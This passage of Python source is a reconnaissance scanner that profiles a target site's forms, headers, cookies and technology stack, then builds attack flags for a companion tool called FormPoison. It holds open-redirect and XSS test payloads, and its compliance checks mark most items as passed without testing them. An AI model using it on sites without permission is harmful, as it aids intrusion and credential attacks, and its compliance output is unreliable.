                    tech_name = f"{framework} {version or ''}".strip()
                    
                    if fingerprint['category'] == 'frontend':
                        if tech_name not in tech_stack['frontend_frameworks']:
                            tech_stack['frontend_frameworks'].append(tech_name)
                    else:
                        if tech_name not in tech_stack['backend_frameworks']:
                            tech_stack['backend_frameworks'].append(tech_name)
        
        # Meta tag analysis
        for meta in soup.find_all('meta'):
            name = meta.get('name', '').lower()
            content = meta.get('content', '').lower()
            
            # CMS detection
            for cms, fingerprint in self.technology_fingerprints['cms'].items():
                if 'generator' in name and cms.lower() in content:
                    version_match = re.search(fingerprint['version_regex'], content)
                    version = version_match.group(1) if version_match else None
                    tech_name = f"{cms} {version or ''}".strip()
                    if tech_name not in tech_stack['cms']:
                        tech_stack['cms'].append(tech_name)
        
        # URL path analysis
        url_path = self.parsed_url.path.lower()
        path_patterns = {
            'WordPress': ['wp-content', 'wp-admin', 'wp-includes'],
            'Drupal': ['sites/default', 'modules/', 'themes/'],
            'Joomla': ['components/com_', 'modules/mod_', 'templates/'],
            'Magento': ['skin/frontend', 'media/catalog'],
            'PrestaShop': ['modules/', 'themes/', 'prestashop']
        }
        
        for cms, patterns in path_patterns.items():
            if any(pattern in url_path for pattern in patterns):
                if cms not in tech_stack['cms']:
                    tech_stack['cms'].append(cms)
        
        # Server header analysis
        server = self.response_headers.get('server', '').lower()
        if 'apache' in server:
            tech_stack['web_servers'].append('Apache')
        elif 'nginx' in server:
            tech_stack['web_servers'].append('Nginx')
        elif 'iis' in server:
            tech_stack['web_servers'].append('Microsoft IIS')
        elif 'litespeed' in server:
            tech_stack['web_servers'].append('LiteSpeed')
        
        # Language detection
        powered_by = self.response_headers.get('x-powered-by', '').lower()
        language_indicators = {
            'php': 'PHP', 'asp.net': 'C#/ASP.NET', 'node': 'Node.js',
            'python': 'Python', 'ruby': 'Ruby', 'java': 'Java',
            'perl': 'Perl', 'go': 'Go'
        }
        
        for indicator, language in language_indicators.items():
            if indicator in server or indicator in powered_by:
                if language not in tech_stack['programming_languages']:
                    tech_stack['programming_languages'].append(language)
        
        # Clean up - remove empty categories
        # FIX: Create a list of categories to remove instead of modifying during iteration
        categories_to_remove = []
        for category, items in tech_stack.items():
            tech_stack[category] = list(set(items))
            if not tech_stack[category]:
                categories_to_remove.append(category)
        
        for category in categories_to_remove:
            del tech_stack[category]
        
        self.results['technology_stack'] = tech_stack
    
    async def _run_advanced_security_checks(self) -> None:
        """Run advanced security checks and tests."""
        
        # Check for CORS misconfiguration
        await self._check_cors_configuration()
        
        # Analyze cookies
        self._analyze_cookies_security()
        
        # Check for information disclosure
        self._check_information_disclosure()
        
        # Analyze redirect behavior
        await self._analyze_redirect_behavior()
    
    async def _check_cors_configuration(self) -> None:
        """Check CORS configuration."""
        cors_headers_list = [
            'access-control-allow-origin',
            'access-control-allow-methods',
            'access-control-allow-headers',
            'access-control-allow-credentials',
            'access-control-expose-headers',
            'access-control-max-age'
        ]
        
        cors_config = {}
        for header in cors_headers_list:
            value = self.response_headers.get(header)
            if value:
                cors_config[header] = value
        
        if cors_config:
            is_weak = False
            if 'access-control-allow-origin' in cors_config:
                if cors_config['access-control-allow-origin'] == '*':
                    is_weak = True
                    if 'CORS_Wildcard_Misconfiguration' not in self.results['attack_vectors']:
                        self.results['attack_vectors'].append('CORS_Wildcard_Misconfiguration')
                elif cors_config.get('access-control-allow-credentials') == 'true':
                    is_weak = True
                    if 'CORS_Credentials_With_Reflected_Origin' not in self.results['attack_vectors']:
                        self.results['attack_vectors'].append('CORS_Credentials_With_Reflected_Origin')
            
            self.results['cors_configuration'] = {
                'headers': cors_config,
                'is_weak': is_weak
            }
    
    def _analyze_cookies_security(self) -> None:
        """Analyze cookie security attributes."""
        set_cookie = self.response_headers.get('set-cookie', '')
        if not set_cookie:
            return
        
        cookies_analysis = []
        for cookie in set_cookie.split(','):
            cookie = cookie.strip()
            cookie_name = cookie.split('=')[0] if '=' in cookie else 'Unknown'
            
            security_flags = {
                'secure': 'secure' in cookie.lower(),
                'httponly': 'httponly' in cookie.lower(),
                'samesite': 'samesite' in cookie.lower()
            }
            
            # Extract SameSite value
            samesite_match = re.search(r'samesite=(\w+)', cookie, re.IGNORECASE)
            samesite_value = samesite_match.group(1) if samesite_match else None
            
            cookies_analysis.append({
                'name': cookie_name,
                'security_flags': security_flags,
                'samesite_value': samesite_value,
                'is_secure': all(security_flags.values())
            })
        
        self.results['cookie_analysis'] = cookies_analysis
    
    def _check_information_disclosure(self) -> None:
        """Check for information disclosure in page content."""
        if not self.page_content:
            return
        
        disclosure_patterns = {
            'email_addresses': r'[a-zA-Z0-9._%+-]+@[a-zA-Z0-9.-]+\.[a-zA-Z]{2,}',
            'api_keys': r'(?i)(?:api|auth|key|token|secret)[:=\s]+["\']?([a-zA-Z0-9_\-]{20,})["\']?',
            'internal_paths': r'(?:/var/www|/home/\w+|C:\\inetpub|C:\\xampp)',
            'debug_info': r'(?i)(?:stack trace|debug|error|warning|notice):',
            'version_numbers': r'(?i)(?:version|ver|v)\s*[:=]?\s*([0-9]+\.[0-9]+\.[0-9]+)'
        }
        
        disclosures = {}
        for disclosure_type, pattern in disclosure_patterns.items():
            matches = re.findall(pattern, self.page_content)
            if matches:
                disclosures[disclosure_type] = list(set(matches))[:5]  # Limit to first 5
        
        if disclosures:
            self.results['information_disclosure'] = disclosures
    
    async def _analyze_redirect_behavior(self) -> None:
        """Analyze redirect behavior for open redirect vulnerabilities."""
        if not self.session:
            return
        
        # Test with common redirect payloads
        redirect_payloads = [
            'https://evil.com',
            '//evil.com',
            '/\\evil.com',
            'https:evil.com',
            'javascript:alert(1)',
            'data:text/html,<script>alert(1)</script>'
        ]
        
        # Check if any URL parameters might be redirect parameters
        parsed = urlparse(self.url)
        params = parse_qs(parsed.query)
        
        redirect_params = []
        redirect_indicators = ['redirect', 'url', 'next', 'return', 'goto', 'target', 'redir']
        
        for param in params:
            if any(indicator in param.lower() for indicator in redirect_indicators):
                redirect_params.append(param)
        
        if redirect_params:
            self.results['redirect_analysis'] = {
                'potential_params': redirect_params,
                'test_payloads': redirect_payloads[:3],
                'risk': 'Open Redirect Potential'
            }
            if 'Open_Redirect' not in self.results['attack_vectors']:
                self.results['attack_vectors'].append('Open_Redirect')
    
    def _generate_recommendations_enhanced(self) -> None:
        """Generate enhanced recommendations based on all findings."""
        recommendations = []
        formpoison_flags = []
        attack_vectors = set()
        
        # Process forms analysis
        for form in self.results['forms_analysis']:
            form_id = form.get('form_id', 0)
            complexity_score = form.get('complexity_score', 0)
            
            # Complexity-based recommendations
            if complexity_score >= 10:
                recommendations.append(f"[CRITICAL] Form {form_id}: Extremely high vulnerability potential (Score: {complexity_score})")
            elif complexity_score >= 7:
                recommendations.append(f"[HIGH] Form {form_id}: High vulnerability potential (Score: {complexity_score})")
            
            # Authentication forms
            if 'login_form_detected' in form.get('vulnerability_indicators', []):
                recommendations.append(f"Form {form_id}: Test authentication bypass techniques")
                formpoison_flags.extend(['--login', '--auth-bypass'])
                attack_vectors.add('Authentication Bypass')
                
                if 'possible_no_rate_limiting' in form.get('vulnerability_indicators', []):
                    recommendations.append(f"Form {form_id}: Possible lack of rate limiting - test credential stuffing")
                    formpoison_flags.append('--brute-force')
                    attack_vectors.add('Brute Force')
            
            # File upload forms
            if 'file_upload_detected' in form.get('vulnerability_indicators', []):
                recommendations.append(f"Form {form_id}: Test file upload vulnerabilities")
                formpoison_flags.extend(['--filemode', '--upload-test'])
                attack_vectors.add('File Upload Attack')
                
                if 'no_file_type_restriction' in form.get('vulnerability_indicators', []):
                    recommendations.append(f"Form {form_id}: No file type restrictions - test malicious upload")
                    formpoison_flags.append('--unrestricted-upload')
            
            # XSS vectors
            portswigger_vectors = form.get('portswigger_vectors', [])
            xss_vectors = [v for v in portswigger_vectors if 'xss' in v.lower()]
            if xss_vectors:
                recommendations.append(f"Form {form_id}: XSS vectors detected ({', '.join(xss_vectors)})")
                formpoison_flags.extend(['--xss', '--xss-all'])
                attack_vectors.add('Cross-Site Scripting (XSS)')
            
            # SQL Injection
            text_fields = form.get('text_input_fields', [])
            if any('sql_injection' in field.get('portswigger_risks', []) for field in text_fields):
                recommendations.append(f"Form {form_id}: SQL Injection potential detected")
                formpoison_flags.extend(['-t SQL', '--sqli-blinds'])
                attack_vectors.add('SQL Injection')
        
        # Technology-specific recommendations
        tech = self.results.get('technology_stack', {})
        
        if 'frontend_frameworks' in tech:
            frontend = tech['frontend_frameworks']
            recommendations.append(f"Modern frameworks detected ({', '.join(frontend)}) - test framework-specific vulnerabilities")
            formpoison_flags.extend(['--sanitizer-bypass', '--mXSS'])
            attack_vectors.add('Framework-Specific Attacks')
        
        if 'cms' in tech:
            cms_list = tech['cms']
            recommendations.append(f"CMS detected ({', '.join(cms_list)}) - test CMS-specific vulnerabilities")
            formpoison_flags.append('--cms-specific')
        
        # Security header recommendations
        headers = self.results.get('security_headers', {})
        missing_critical = [
            header for header, info in headers.items() 
            if info.get('status') == '❌ Missing' and info.get('risk_level') == 'high'
        ]
        
        if missing_critical:
            recommendations.append(f"Missing critical security headers: {', '.join(missing_critical)}")
            formpoison_flags.append('--header-testing')
            attack_vectors.add('Security Header Bypass')
        
        # CORS issues
        if self.results.get('cors_configuration', {}).get('is_weak'):
            recommendations.append("Weak CORS configuration detected - test CORS bypass")
            formpoison_flags.append('--cors-bypass')
            attack_vectors.add('CORS Attack')
        
        # Cookie issues
        cookie_analysis = self.results.get('cookie_analysis', [])
        insecure_cookies = [c['name'] for c in cookie_analysis if not c.get('is_secure')]
        if insecure_cookies:
            recommendations.append(f"Insecure cookies detected: {', '.join(insecure_cookies)}")
            attack_vectors.add('Session Hijacking')
        
        # Advanced flags based on overall risk
        total_risk_score = sum(f.get('complexity_score', 0) for f in self.results['forms_analysis'])
        if total_risk_score > 20:
            formpoison_flags.extend(['--verbose-all', '--deep-scan', '--aggressive'])
        elif total_risk_score > 10:
            formpoison_flags.extend(['--verbose', '--standard-scan'])
        else:
            formpoison_flags.append('--quick-scan')
        
        # Deduplicate flags while preserving order
        seen = set()
        unique_flags = []
        for flag in formpoison_flags:
            if flag not in seen:
                seen.add(flag)
                unique_flags.append(flag)
        
        self.results['recommendations'] = recommendations
        self.results['formpoison_flags'] = unique_flags
        self.results['attack_vectors'] = list(attack_vectors)
    
    def _generate_compliance_report(self) -> None:
        """Generate compliance report based on findings."""
        compliance = {
            'owasp_top_10': self._check_owasp_compliance(),
            'pci_dss': self._check_pci_compliance(),
            'gdpr': self._check_gdpr_compliance(),
            'hipaa': self._check_hipaa_compliance()
        }
        
        self.results['compliance_report'] = compliance
    
    def _check_owasp_compliance(self) -> Dict:
        """Check OWASP Top 10 compliance."""
        owasp_checks = {
            'A1:2021-Broken Access Control': True,
            'A2:2021-Cryptographic Failures': True,
            'A3:2021-Injection': True,
            'A4:2021-Insecure Design': True,
            'A5:2021-Security Misconfiguration': True,
            'A6:2021-Vulnerable Components': True,
            'A7:2021-Auth Failures': True,
            'A8:2021-Software Integrity': True,
            'A9:2021-Logging Failures': True,
            'A10:2021-SSRF': True
        }
        
        # Check for actual issues
        if any('sql_injection' in str(form) for form in self.results['forms_analysis']):
            owasp_checks['A3:2021-Injection'] = False
        
        security_headers = self.results.get('security_headers', {})
        if any(info.get('status') == '❌ Missing' for info in security_headers.values()):
            owasp_checks['A5:2021-Security Misconfiguration'] = False
        
        if any('login_form' in str(form) for form in self.results['forms_analysis']):
            owasp_checks['A7:2021-Auth Failures'] = False
        
        return {
            'compliant': all(owasp_checks.values()),
            'checks': owasp_checks
        }
    
    def _check_pci_compliance(self) -> Dict:
        """Check PCI DSS compliance requirements."""
        pci_checks = {
            '6.5.1-Injection flaws': True,
            '6.5.2-Buffer overflows': True,
            '6.5.3-Insecure cryptographic storage': True,
            '6.5.4-Insecure communications': True,
            '6.5.5-Improper error handling': True,
            '6.5.6-XSS': True,
            '6.5.7-Improper access control': True,
            '6.5.8-CSRF': True,
            '6.5.9-Broken authentication': True
        }
        
        # Check for actual issues
        forms_analysis = self.results['forms_analysis']
        if any('sql_injection' in str(form) for form in forms_analysis):
            pci_checks['6.5.1-Injection flaws'] = False
        
        if any('xss' in str(form).lower() for form in forms_analysis):
            pci_checks['6.5.6-XSS'] = False
        
        if any('csrf' in str(form).lower() for form in forms_analysis):
            pci_checks['6.5.8-CSRF'] = False
        
        return {
            'compliant': all(pci_checks.values()),
            'checks': pci_checks
        }
    
    def _check_gdpr_compliance(self) -> Dict:
        """Check GDPR compliance requirements."""
        gdpr_checks = {
            'Data encryption in transit': self.response_headers.get('strict-transport-security') is not None,
            'Secure cookie handling': all(c.get('is_secure', False) for c in self.results.get('cookie_analysis', [])),
            'Data minimization': True,
            'User consent mechanisms': True
        }
        
        return {
            'compliant': all(gdpr_checks.values()),
            'checks': gdpr_checks
        }
    
    def _check_hipaa_compliance(self) -> Dict:
        """Check HIPAA compliance requirements."""
        hipaa_checks = {
            'Encryption at rest': True,
            'Encryption in transit': self.response_headers.get('strict-transport-security') is not None,
            'Access controls': True,
            'Audit logging': True
        }
        
        return {
            'compliant': all(hipaa_checks.values()),
            'checks': hipaa_checks
        }
    
    def _create_risk_assessment(self) -> None:
        """Create overall risk assessment."""
        total_forms = len(self.results['forms_analysis'])
        high_risk_forms = sum(1 for f in self.results['forms_analysis'] if f.get('complexity_score', 0) >= 7)
        critical_forms = sum(1 for f in self.results['forms_analysis'] if f.get('complexity_score', 0) >= 10)
        
        # Calculate risk score (0-100)
        risk_score = 0
        risk_score += len(self.results.get('attack_vectors', [])) * 5
        risk_score += high_risk_forms * 10
        risk_score += critical_forms * 15
        
        missing_critical_headers = sum(
            1 for info in self.results.get('security_headers', {}).values() 
            if info.get('status') == '❌ Missing' and info.get('risk_level') == 'high'
        )
        risk_score += missing_critical_headers * 8
        
        risk_score = min(risk_score, 100)
        
        if risk_score >= 75:
            risk_level = 'CRITICAL'
            color = 'red'
        elif risk_score >= 50:
            risk_level = 'HIGH'
            color = 'orange1'
        elif risk_score >= 25:
            risk_level = 'MEDIUM'
            color = 'yellow'
        else:
            risk_level = 'LOW'
            color = 'green'
        
        self.results['risk_assessment'] = {
            'risk_score': risk_score,
            'risk_level': risk_level,
            'color': color,
            'critical_forms': critical_forms,
            'high_risk_forms': high_risk_forms,
            'total_forms': total_forms,
            'missing_critical_headers': missing_critical_headers,
            'attack_vectors_count': len(self.results.get('attack_vectors', []))
        }
    
    def _build_remediation_plan(self) -> None:
        """Build detailed remediation plan."""
        remediation = []
        
        # Forms remediation
        for form in self.results['forms_analysis']:
            form_id = form.get('form_id', 0)
            
            if form.get('method') == 'GET' and form.get('text_input_fields'):
                remediation.append({
                    'priority': 'HIGH',
                    'form_id': form_id,
                    'issue': 'Sensitive data in GET request',
                    'action': f'Change Form {form_id} method to POST for sensitive data',
                    'effort': 'Low'
                })
            
            has_csrf = any('csrf' in f.get('name', '').lower() for f in form.get('all_fields', []))
            if not has_csrf and form.get('method') != 'GET':
                remediation.append({
                    'priority': 'HIGH',
                    'form_id': form_id,
                    'issue': 'Missing CSRF protection',
                    'action': f'Implement CSRF tokens in Form {form_id}',
                    'effort': 'Medium'
                })
        
        # Headers remediation
        for header, info in self.results.get('security_headers', {}).items():
            if info.get('status') == '❌ Missing':
                remediation.append({
                    'priority': info.get('risk_level', 'low').upper(),
                    'issue': f'Missing {header}',
                    'action': info.get('recommendation', f'Implement {header}'),
                    'effort': 'Low'
                })
        
        self.results['remediation_plan'] = remediation
    
    def _display_comprehensive_report(self) -> None:
        """Display comprehensive analysis report."""
        
        # Executive Summary
        risk = self.results.get('risk_assessment', {})
        console.print(Panel.fit(
            f"[bold]EXECUTIVE SUMMARY[/bold]\n\n"
            f"Target: {self.results['url']}\n"
            f"Risk Level: [bold {risk.get('color', 'white')}]{risk.get('risk_level', 'UNKNOWN')}[/bold {risk.get('color', 'white')}]\n"
            f"Risk Score: {risk.get('risk_score', 0)}/100\n"
            f"Forms Analyzed: {risk.get('total_forms', 0)}\n"
            f"Critical Forms: {risk.get('critical_forms', 0)}\n"
            f"Attack Vectors: {risk.get('attack_vectors_count', 0)}",
            title="📊 FormAtion Analysis Report",
            border_style=risk.get('color', 'white')
        ))
        
        # Forms Analysis
        if self.results['forms_analysis']:
            console.print("\n[bold cyan]📋 FORM ANALYSIS[/bold cyan]")
            
            for form in self.results['forms_analysis']:
                form_id = form.get('form_id', 0)
                score = form.get('complexity_score', 0)
                
                # Risk color
                if score >= 10:
                    risk_color = 'red'
                    risk_level = 'CRITICAL'
                elif score >= 7:
                    risk_color = 'orange1'
                    risk_level = 'HIGH'
                elif score >= 4:
                    risk_color = 'yellow'
                    risk_level = 'MEDIUM'
                else:
                    risk_color = 'green'
                    risk_level = 'LOW'
                
                form_table = Table(
                    title=f"Form {form_id} - {risk_level} RISK (Score: {score})",
                    header_style=f"bold {risk_color}",
                    box=box.ROUNDED
                )
                
                form_table.add_column("Field", style="cyan")
                form_table.add_column("Type", style="white")
                form_table.add_column("Category", style="green")
                form_table.add_column("Risks", style="red")
                
                for field in form.get('text_input_fields', []):
                    risks = ', '.join(field.get('portswigger_risks', [])[:3])
                    form_table.add_row(
                        field.get('name', 'N/A'),
                        field.get('field_type', 'text'),
                        field.get('field_category', 'other'),
                        risks if risks else 'None'
                    )
                
                console.print(form_table)
                
                if form.get('portswigger_vectors'):
                    console.print(f"[bold cyan]Attack Vectors:[/bold cyan] {', '.join(form['portswigger_vectors'][:5])}")
        
        # Security Headers
        if self.results.get('security_headers'):
            console.print("\n[bold cyan]🛡️ SECURITY HEADERS[/bold cyan]")
            
            headers_table = Table(
                title="Security Headers Analysis",
                header_style="bold blue",
                box=box.ROUNDED
            )
            
            headers_table.add_column("Header", style="cyan")
            headers_table.add_column("Status", style="white")
            headers_table.add_column("Risk", style="red")
            
            for header, info in self.results['security_headers'].items():
                status_style = 'green' if info.get('is_compliant') else 'red'
                headers_table.add_row(
                    header,
                    f"[{status_style}]{info['status']}[/{status_style}]",
                    info.get('risk_level', 'unknown').upper()
                )
            
            console.print(headers_table)
        
        # Technology Stack
        if self.results.get('technology_stack'):
            console.print("\n[bold cyan]🔧 TECHNOLOGY STACK[/bold cyan]")
            
            tech_tree = Tree("Detected Technologies")
            for category, technologies in self.results['technology_stack'].items():
                if technologies:
                    category_node = tech_tree.add(f"[bold]{category.replace('_', ' ').title()}[/bold]")
                    for tech in technologies:
                        category_node.add(f"[green]{tech}[/green]")
            
            console.print(tech_tree)
        
        # Recommendations and Command
        if self.results.get('formpoison_flags'):
            command = f"python formpoison.py {self.url} {' '.join(self.results['formpoison_flags'])}"
            console.print(Panel.fit(
                f"🎯 [bold cyan]Recommended FormPoison Command[/bold cyan]\n\n"
                f"[white]{command}[/white]",
                border_style="cyan",
                title="Execute"
            ))
        
        # Attack Vectors
        if self.results.get('attack_vectors'):
            console.print("\n[bold red]⚡ IDENTIFIED ATTACK VECTORS[/bold red]")
            for vector in self.results['attack_vectors']:
                console.print(f"  • [yellow]{vector}[/yellow]")
        
        # Compliance Summary
        compliance = self.results.get('compliance_report', {})
        if compliance:
            console.print("\n[bold green]📜 COMPLIANCE STATUS[/bold green]")
            
            for standard, report in compliance.items():
                status = "[green]✅ Compliant[/green]" if report.get('compliant') else "[red]❌ Non-Compliant[/red]"
                console.print(f"  {standard.upper()}: {status}")

async def main():
    """Main entry point with enhanced argument parsing."""
    parser = argparse.ArgumentParser(
        description="FormAtion - Advanced Web Form Analyzer for FormPoison",
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog="""
Examples:
  %(prog)s https://example.com
  %(prog)s https://example.com --output results.json
  %(prog)s https://example.com --user-agent "Custom/1.0" --proxy http://proxy:8080
        """
    )
    
    parser.add_argument("url", help="Target URL to analyze")
    parser.add_argument("--user-agent", help="Custom User-Agent string")
    parser.add_argument("--proxy", help="Proxy URL (e.g., http://proxy:8080)")
    parser.add_argument("--output", "-o", help="Save results to JSON file")
    parser.add_argument("--timeout", type=int, default=30, help="Request timeout in seconds")
    parser.add_argument("--no-ssl-verify", action="store_true", help="Disable SSL verification")
    parser.add_argument("--max-redirects", type=int, default=5, help="Maximum redirects to follow")
    parser.add_argument("--version", action="version", version=f"FormAtion {FormAtionAnalyzer.VERSION}")
    
    args = parser.parse_args()
    
    # Display banner
    console.print(Panel.fit(
        "[bold cyan]FormAtion[/bold cyan] [bold white]v" + FormAtionAnalyzer.VERSION + "[/bold white]\n"
        "[dim]Advanced Web Form Analyzer - Pre-scout for FormPoison[/dim]\n"
        "[dim]PortSwigger Research Methodology[/dim]",
        border_style="cyan"
    ))
    
    async with FormAtionAnalyzer(
        url=args.url,
        user_agent=args.user_agent,
        proxies=args.proxy,
        timeout=args.timeout,
        max_redirects=args.max_redirects,
        verify_ssl=not args.no_ssl_verify
    ) as analyzer:
        try:
            results = await analyzer.analyze_site()
        except Exception as e:
            console.print(f"[bold red]Error during FormAtion analysis: {str(e)}[/bold red]")
            logger.exception("Analysis failed")
            return
    
    # Save results if requested
    if args.output:
        try:
            with open(args.output, 'w') as f:
                json.dump(results, f, indent=2, default=str)
            console.print(f"\n[bold green]✅ Results saved to: {args.output}[/bold green]")
        except Exception as e:
            console.print(f"[bold red]Error saving results: {str(e)}[/bold red]")

if __name__ == "__main__":
    asyncio.run(main())
